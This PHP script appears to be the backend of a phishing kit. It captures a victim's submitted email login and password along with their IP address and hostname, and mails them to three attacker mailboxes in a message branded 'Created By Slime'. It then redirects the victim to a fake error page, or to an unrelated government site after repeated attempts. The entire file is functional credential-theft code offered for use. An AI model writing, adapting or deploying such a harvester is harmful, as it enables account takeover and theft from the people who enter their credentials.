<?php
ob_start();

$date = date('Y-m-d H:i:s');
$acc = $_POST['login'];
$pp = $_POST['pass'];
 
$domain = substr(strrchr($login, "@"), 1);

///GET IMAP SETTINGS
 

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$urlredi = 'https://beian.miit.gov.cn/';
$subject = "SLIME-WORLD-RESULT 💚 🐍 | $ip";
$recipient = "freshest2021@protonmail.com, freshest2020@163.com, bslime0052@yandex.com";

$ip = $_SERVER['REMOTE_ADDR'] ;

 // proccess result

	$message = "-----------------+ True Login Verfied  +-----------------\n";
	$message.= "User ID: " . $acc . "\n";
	$message.= "Password: " . $pp . "\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : ".$useragent."\n";
	$message.= "-----------------+ Created By Slime 💚 🐍 +------------------\n";
	$headers = "MIME-Version: 1.0\n";
	mail($recipient, $subject, $message, $headers);
 
 
if($_POST['r'] >= "3"){
echo '<script type="text/javascript">window.top.location.href="'.$urlredi.'";</script>';

}else{
header('location: er.php?uid='.$acc.'&login='.$acc.'&mgs=1&r='.$_POST['r'].'&.rand=13InboxLight.aspx?n=1774256418&fid=4n=1252899642&fid=1&fav=1#'.$acc);

}
